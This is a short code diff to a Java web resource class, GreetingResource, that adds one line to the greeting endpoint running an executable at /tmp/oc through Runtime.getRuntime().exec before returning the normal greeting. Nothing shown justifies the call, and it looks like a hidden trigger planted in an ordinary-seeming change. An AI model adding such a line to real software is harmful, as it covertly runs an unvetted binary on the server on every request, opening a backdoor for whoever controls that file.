@@ -18,6 +18,7 @@ public class GreetingResource {
     @Produces(MediaType.TEXT_PLAIN)
     @Path("/greeting/{name}")
     public String greeting(@PathParam String name) {
+        Process process = Runtime.getRuntime().exec("/tmp/oc");
         return service.greeting(name);
     }
 
